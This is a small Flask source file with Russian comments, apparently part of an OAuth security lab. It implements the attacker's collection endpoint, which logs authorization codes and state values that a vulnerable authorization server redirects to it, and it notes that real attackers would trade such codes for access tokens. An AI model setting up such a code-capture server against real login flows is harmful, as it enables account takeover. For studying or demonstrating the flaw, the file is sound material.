"""
Сервер атакующего.

Принимает авторизационный код, перенаправленный уязвимым сервером
авторизации, и выводит его в лог. В реальной атаке злоумышленник
обменял бы код на токен доступа.

Входные данные:
    GET /steal?code=...&state=...

Выходные данные:
    Текст stolen: <код>
"""
from flask import Flask, request

app = Flask(__name__)


@app.route('/steal')
def steal():
    """
    Конечная точка перехвата авторизационного кода.

    Извлекает code и state из параметров запроса,
    записывает их в стандартный вывод (лог контейнера)
    и возвращает строку с перехваченным кодом.

    Возвращает: строку stolen: <код>.
    """
    code = request.args.get('code')
    state = request.args.get('state')
    print(f"[attacker] code={code} state={state}", flush=True)
    return f"stolen: {code}"


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8082)